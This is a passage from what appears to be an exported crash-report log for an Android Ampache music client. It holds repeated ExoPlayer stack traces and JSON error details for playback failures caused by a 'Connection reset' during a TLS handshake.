"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
FkaSFemz,2025-07-19T19:38:19.046,powerampache,PHP,Saturday 19th of July 2025 12:38:19 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":71},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167891751,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":71},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167891751,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
wT0MQ5tb,2025-07-19T19:38:15.676,powerampache,PHP,Saturday 19th of July 2025 12:38:16 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":71},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167888358,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source 